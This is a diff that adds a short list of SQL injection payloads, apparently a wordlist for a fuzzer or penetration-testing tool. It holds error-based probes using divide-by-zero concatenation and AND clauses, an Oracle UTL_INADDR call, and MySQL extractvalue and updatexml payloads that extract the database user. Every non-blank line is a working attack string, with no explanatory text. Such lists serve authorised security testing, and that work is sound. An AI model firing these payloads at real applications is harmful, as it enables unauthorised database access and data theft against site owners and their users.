@@ -1,0 +1,10 @@
+' || (SELECT 1/0) || '
+" || (SELECT 1/0) || "
+') || (SELECT 1/0) || ('
+' AND (SELECT 1/0)-- -
+" AND (SELECT 1/0)-- -
+||UTL_INADDR.get_host_name( (SELECT user FROM dual) )||
+extractvalue(1,concat(0x5c,(select user())))
+updatexml(1,concat(0x5c,(select user())),1)
+
+
